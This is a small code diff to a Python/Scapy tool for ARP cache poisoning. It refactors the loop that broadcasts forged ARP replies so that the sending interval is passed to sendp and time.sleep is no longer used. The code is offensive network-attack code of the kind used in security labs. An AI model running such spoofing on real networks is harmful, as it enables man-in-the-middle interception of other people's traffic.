@@ -10,7 +10,6 @@ ARP cache poisoning implementation using Scapy.
 from argparse import ArgumentParser
 from os import geteuid
 from sys import exit as sysexit
-from time import sleep
 
 from scapy.layers.l2 import Ether, ARP, get_if_hwaddr
 from scapy.sendrecv import sendp
@@ -28,9 +27,9 @@ def arp_mitm(interface, target, interval=10.0):
     while 1:
         sendp(
             Ether(dst="FF:FF:FF:FF:FF:FF") /
-            ARP(op="is-at", psrc=target, hwsrc=my_mac)
+            ARP(op="is-at", psrc=target, hwsrc=my_mac),
+            inter=interval
         )
-        sleep(interval)
 
 
 def get_arg_parser():
